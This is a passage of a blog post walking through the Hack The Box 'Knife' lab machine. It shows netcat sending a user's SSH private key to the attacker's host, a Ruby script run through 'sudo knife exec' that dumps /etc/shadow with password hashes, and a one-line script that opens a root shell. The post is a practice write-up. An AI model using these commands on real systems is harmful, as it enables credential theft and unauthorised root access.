control <span class="keyword">in</span> this shell</span><br><span class="line">james@knife:/$ <span class="built_in">id</span></span><br><span class="line"><span class="built_in">id</span></span><br><span class="line">uid=1000(james) gid=1000(james) <span class="built_in">groups</span>=1000(james)</span><br><span class="line">james@knife:/$ <span class="built_in">whoami</span></span><br><span class="line"><span class="built_in">whoami</span></span><br><span class="line">james</span><br><span class="line">james@knife:~$ <span class="built_in">ls</span></span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line">user.txt</span><br><span class="line">james@knife:~$ <span class="built_in">cat</span> user.txt</span><br><span class="line"><span class="built_in">cat</span> user.txt</span><br><span class="line">945ec57fe12663455c03058393f2abff</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1986.jpg"></li>
+</ul>
+<h1 id="PrivESC"><a href="#PrivESC" class="headerlink" title="PrivESC"></a>PrivESC</h1><h2 id="SSH-Access"><a href="#SSH-Access" class="headerlink" title="SSH Access"></a>SSH Access</h2><p>Before PrivESC let’s just get the stable shell looking into users .ssh we found the key id_rsa</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">cd</span> .ssh</span><br><span class="line"><span class="built_in">cp</span> id_rsa.pub authorized_keys</span><br><span class="line">nc 10.10.14.18 1111 &lt; id_rsa   (target machine)</span><br><span class="line">nc -lvp 1111 &gt; id_rsa    (<span class="built_in">local</span> kali machine)</span><br></pre></td></tr></table></figure>
+
+<p>and then in your shell</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/HackTheBox/Knife$ nc -lvp 1111 &gt; id_rsa</span><br><span class="line">listening on [any] 1111 ...</span><br><span class="line">connect to [YOUR IP] from (UNKNOWN) [10.10.10.242] 37114</span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/knife]</span><br><span class="line">└─<span class="comment"># chmod 700 id_rsa                                                                                                              </span></span><br><span class="line">┌──(root💀kali)-[~/hackthebox/machine/knife]</span><br><span class="line">└─<span class="comment"># ssh -i id_rsa james@10.10.10.242                                                                                              </span></span><br><span class="line">The authenticity of host <span class="string">&#x27;10.10.10.242 (10.10.10.242)&#x27;</span> can<span class="string">&#x27;t be established.</span></span><br><span class="line"><span class="string">ECDSA key fingerprint is SHA256:b8jYX4F9OUtvZffH50q3L3B4hrSL/TxxPuue0hlbvRU.</span></span><br><span class="line"><span class="string">Are you sure you want to continue connecting (yes/no/[fingerprint])? yes</span></span><br><span class="line"><span class="string">Warning: Permanently added &#x27;</span>10.10.10.242<span class="string">&#x27; (ECDSA) to the list of known hosts.</span></span><br><span class="line"><span class="string">Welcome to Ubuntu 20.04.2 LTS (GNU/Linux 5.4.0-72-generic x86_64)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"> * Documentation:  https://help.ubuntu.com</span></span><br><span class="line"><span class="string"> * Management:     https://landscape.canonical.com</span></span><br><span class="line"><span class="string"> * Support:        https://ubuntu.com/advantage</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System information as of Sun 23 May 2021 04:44:53 AM UTC</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">  System load:             0.07</span></span><br><span class="line"><span class="string">  Usage of /:              51.3% of 9.72GB</span></span><br><span class="line"><span class="string">  Memory usage:            57%</span></span><br><span class="line"><span class="string">  Swap usage:              0%</span></span><br><span class="line"><span class="string">  Processes:               337</span></span><br><span class="line"><span class="string">  Users logged in:         0</span></span><br><span class="line"><span class="string">  IPv4 address for ens160: 10.10.10.242</span></span><br><span class="line"><span class="string">  IPv6 address for ens160: dead:beef::250:56ff:feb9:7b4d</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">18 updates can be applied immediately.</span></span><br><span class="line"><span class="string">13 of these updates are standard security updates.</span></span><br><span class="line"><span class="string">To see these additional updates run: apt list --upgradable</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">james@knife:~$ id</span></span><br><span class="line"><span class="string">uid=1000(james) gid=1000(james) groups=1000(james)</span></span><br><span class="line"><span class="string">james@knife:~$ whoami</span></span><br><span class="line"><span class="string">james</span></span><br></pre></td></tr></table></figure>
+
+<p>Now we have the stable shell now lets enumerate for PrivESC.</p>
+<h2 id="Enumeration-1"><a href="#Enumeration-1" class="headerlink" title="Enumeration"></a>Enumeration</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ <span class="built_in">cat</span> ex.rb </span><br><span class="line">puts File.<span class="built_in">read</span>(<span class="string">&#x27;/etc/shadow&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>Looking into user’s home directory we can see an intresting ruby file which can read &#x2F;etc&#x2F;shadow but the catch is we dont have ruby on the box or at least on the desired path and the desired name.</p>
+<h3 id="sudo-l"><a href="#sudo-l" class="headerlink" title="sudo -l"></a>sudo -l</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ sudo -l</span><br><span class="line">Matching Defaults entries <span class="keyword">for</span> james on knife:</span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin</span><br><span class="line"></span><br><span class="line">User james may run the following commands on knife:</span><br><span class="line">    (root) NOPASSWD: /usr/bin/knife</span><br></pre></td></tr></table></figure>
+
+<p>Analysing the file &#x2F;usr&#x2F;bin&#x2F;knife</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ file /usr/bin/knife </span><br><span class="line">/usr/bin/knife: symbolic <span class="built_in">link</span> to /opt/chef-workstation/bin/knife</span><br></pre></td></tr></table></figure>
+
+<p>It’s symbolic link to another file &#x2F;opt&#x2F;chef-workstation&#x2F;bin&#x2F;knife.<br>looking at the directory &#x2F;opt&#x2F;chef-workstation we can see it a ruby installation.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ <span class="built_in">ls</span> /opt/chef-workstation/</span><br><span class="line">bin  components  embedded  gem-version-manifest.json  gitbin  LICENSE  LICENSES  version-manifest.json  version-manifest.txt</span><br></pre></td></tr></table></figure>
+
+<p>so basically on this box ruby commands can be run using &#x2F;usr&#x2F;bin&#x2F;knife.<br>running &#x2F;usr&#x2F;bin&#x2F;knife we get the big help menu.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ sudo /usr/bin/knife</span><br><span class="line">&lt;-----SNIP------&gt;</span><br><span class="line">** EXEC COMMANDS **</span><br><span class="line">knife <span class="built_in">exec</span> [SCRIPT] (options)</span><br></pre></td></tr></table></figure>
+
+<p>Now let’s run our ex.rb script</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ sudo /usr/bin/knife <span class="built_in">exec</span> ex.rb</span><br><span class="line"></span><br><span class="line">root:$6<span class="variable">$LCKz7Uz</span>/FuWPPJ6o<span class="variable">$LaOquetpLJIhOzr7YwJzFPX4NdDDHokHtUz</span>.k4S1.CY7D/ECYVfP4Q5eS43/PMtsOa5up1ThgjB3.xUZsHyHA1:18754:0:99999:7:::</span><br><span class="line">daemon:*:18659:0:99999:7::</span><br><span class="line">bin:*:18659:0:99999:7:::</span><br><span class="line">sys:*:18659:0:99999:7:::</span><br><span class="line"><span class="built_in">sync</span>:*:18659:0:99999:7:::</span><br><span class="line">games:*:18659:0:99999:7:::</span><br><span class="line">man:*:18659:0:99999:7:::</span><br><span class="line">lp:*:18659:0:99999:7:::</span><br><span class="line">mail:*:18659:0:99999:7:::</span><br><span class="line">news:*:18659:0:99999:7:::</span><br><span class="line">uucp:*:18659:0:99999:7:::</span><br><span class="line">proxy:*:18659:0:99999:7:::</span><br><span class="line">www-data:*:18659:0:99999:7:::</span><br><span class="line">backup:*:18659:0:99999:7:::</span><br><span class="line">list:*:18659:0:99999:7:::</span><br><span class="line">irc:*:18659:0:99999:7:::</span><br><span class="line">gnats:*:18659:0:99999:7:::</span><br><span class="line">nobody:*:18659:0:99999:7:::</span><br><span class="line">systemd-network:*:18659:0:99999:7:::</span><br><span class="line">systemd-resolve:*:18659:0:99999:7:::</span><br><span class="line">systemd-timesync:*:18659:0:99999:7:::</span><br><span class="line">messagebus:*:18659:0:99999:7:::</span><br><span class="line">syslog:*:18659:0:99999:7:::</span><br><span class="line">_apt:*:18659:0:99999:7:::</span><br><span class="line">tss:*:18659:0:99999:7:::</span><br><span class="line">uuidd:*:18659:0:99999:7:::</span><br><span class="line">tcpdump:*:18659:0:99999:7:::</span><br><span class="line">landscape:*:18659:0:99999:7:::</span><br><span class="line">pollinate:*:18659:0:99999:7:::</span><br><span class="line">usbmux:*:18753:0:99999:7:::</span><br><span class="line">sshd:*:18753:0:99999:7:::</span><br><span class="line">systemd-coredump:!!:18753::::::</span><br><span class="line">james:$6<span class="variable">$S4BgtW0nZi</span>/8w.C0<span class="variable">$pREFaCmQmAue0cm6eTgvF</span>.vFdhsIdTr5q6PdrMVNCw4hc7TmlSqAcgMz0yOBG7mT6GcoH9gGbo.zLLG/VeT31/:18754:0:99999:7:::</span><br><span class="line">lxd:!:18753::::::</span><br><span class="line">opscode:!:18754::::::</span><br><span class="line">opscode-pgsql:!:18754::::::</span><br></pre></td></tr></table></figure>
+
+<p>Now we can write our own ruby script to run the system commands.<br>I wrote a simple ruby script to run &#x2F;bin&#x2F;bash</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ <span class="built_in">echo</span> <span class="string">&quot;system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; getroot.rb</span><br><span class="line">james@knife:~$ <span class="built_in">cat</span> getroot.rb </span><br><span class="line">system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">james@knife:~$ sudo /usr/bin/knife <span class="built_in">exec</span> getroot.rb</span><br><span class="line">root@knife:/home/james<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br></pre></td></tr></table></figure>
+
+<p>We are root now so let’s get all the flags.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">james@knife:~$ <span class="built_in">echo</span> <span class="string">&quot;system(&#x27;/bin/bash&#x27;)&quot;</span> &gt; getroot.rb</span><br><span class="line">james@knife:~$ <span class="built_in">cat</span> getroot.rb </span><br><span class="line">system(<span class="string">&#x27;/bin/bash&#x27;</span>)</span><br><span class="line">james@knife:~$ sudo /usr/bin/knife <span class="built_in">exec</span> getroot.rb</span><br><span class="line">root@knife:/home/james<span class="comment"># id</span></span><br><span class="line">uid=0(root) gid=0(root) <span class="built_in">groups</span>=0(root)</span><br><span class="line">root@knife:/home/james<span class="comment"># whoami</span></span><br><span class="line">root</span><br><span class="line">root@knife:/home/james<span class="comment"># cd</span></span><br><span class="line">root@knife:~<span class="comment"># ls</span></span><br><span class="line">delete.sh  root.txt  snap</span><br><span class="line">root@knife:~<span class="comment"># cat root.txt </span></span><br><span class="line">bb5ea8e23a0de786ce9def00513a2121</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/htb1987.jpg"></li>
+</ul>
+<h3 id="Summary-of-knowledge"><a href="#Summary-of-knowledge" class="headerlink" title="Summary of knowledge"></a>Summary of knowledge</h3><ul>
+<li>PHP 8.1.0-dev develop version backdoor getshell</li>
+<li>ruby script privesc</li>
+</ul>
+<h3 id="Contact-me"><a href="#Contact-me" class="headerlink" title="Contact me"></a>Contact me</h3><ul>
+<li>QQ: 1185151867</li>
+<li>twitter: <span class="exturl" data-url="aHR0cHM6Ly90d2l0dGVyLmNvbS9mZGx1Y2lmZXIxMQ==">https://twitter.com/fdlucifer11<i class="fa fa-external-link-alt"></i></span></li>
+<li>github: <span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==">https://github.com/FDlucifer<i class="fa fa-external-link-alt"></i></span></li>
+</ul>
+<p><font color="blue">I’m lUc1f3r11, a ctfer, reverse engineer, ioter, red teamer, coder, gopher, pythoner, AI lover, security reseacher, hacker, bug hunter and more…</font></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechatpay.png" alt="lUc1f3r11 WeChat Pay">
+        <span>WeChat Pay</span>
+      </div>
+      <div>
+        <img src="/images/alipay.png" alt="lUc1f3r11 Alipay">
+        <span>Alipay</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>lUc1f3r11
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://fdlucifer.github.io/2021/05/23/knife/" title="Hack-The-Box-walkthrough[knife]">https://fdlucifer.github.io/2021/05/23/knife/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <span class="exturl" data-url="aHR0cHM6Ly9jcmVhdGl2ZWNvbW1vbnMub3JnL2xpY2Vuc2VzL2J5LW5jLXNhLzQuMC9kZWVkLnpo"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</span> unless stating additionally.
+  </li>
+</ul>
+</div>
+
+          <div class="followme">
+  <span>Welcome to my other publishing channels</span>
+
+  <div class="social-list">
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://twitter.com/fdlucifer11">
+            <span class="icon">
+              <i class="fab fa-twitter"></i>
+            </span>
+
+            <span class="label">Twitter</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://t.me/FDkiller">
+            <span class="icon">
+              <i class="fab fa-telegram"></i>
+            </span>
+
+            <span class="label">Telegram</span>
+          </a>
+      </div>
+
+      <div class="social-item">
+          <span class="social-link">
+            <span class="icon">
+              <i class="fab fa-weixin"></i>
+            </span>
+
+            <span class="label">WeChat</span>
+          </span>
+
+          <img class="social-item-img" src="/images/wechat_channel.jpg">
+      </div>
+
+      <div class="social-item">
+          <a target="_blank" class="social-link" href="https://infosec.exchange/@lUc1f3r11">
+            <span class="icon">
+              <i class="custom mastodon"></i>
+            </span>
+
+            <span class="label">infosec.exchange</span>
+          </a>
+      </div>
+  </div>
+</div>
+
+          <div class="post-tags">
+              <a href="/tags/HackTheBox%E9%9D%B6%E6%9C%BA%E7%BB%83%E4%B9%A0/" rel="tag"><i class="fa fa-tag"></i> HackTheBox靶机练习</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/05/22/pit/" rel="prev" title="Hack-The-Box-walkthrough[pit]">
+                  <i class="fa fa-chevron-left"></i> Hack-The-Box-walkthrough[pit]
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/06/04/spider/" rel="next" title="Hack-The-Box-walkthrough[spider]">
+                  Hack-The-Box-walkthrough[spider] <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 2017 – 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">lUc1f3r11</span>
+</div>
+  <div class="powered-by">Powered by <span class="exturl" data-url="aHR0cHM6Ly9oZXhvLmlv">Hexo</span> & <span class="exturl" data-url="aHR0cHM6Ly90aGVtZS1uZXh0LmpzLm9yZy9tdXNlLw==">NexT.Muse</span>
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="reading-progress-bar"></div>
+  <a role="button" class="book-mark-link book-mark-link-fixed"></a>
+
+  <span class="exturl github-corner" data-url="aHR0cHM6Ly9naXRodWIuY29tL0ZEbHVjaWZlcg==" title="Follow me on GitHub" aria-label="Follow me on GitHub"><svg width="80" height="80" viewBox="0 0 250 250" aria-hidden="true"><path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path><path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path></svg></span>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/animejs/3.2.1/anime.min.js" integrity="sha256-XL2inqUJaslATFnHdJOi9GfQ60on8Wx1C2H8DYiN1xY=" crossorigin="anonymous"></script>
+<script src="/js/comments.js"></script><script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/schemes/muse.js"></script><script src="/js/next-boot.js"></script><script src="/js/bookmark.js"></script>
+
+  
+
+
+
+  <script src="/js/third-party/pace.js"></script>
+
+  
+
+
+
+
+
+</body>
+</html>
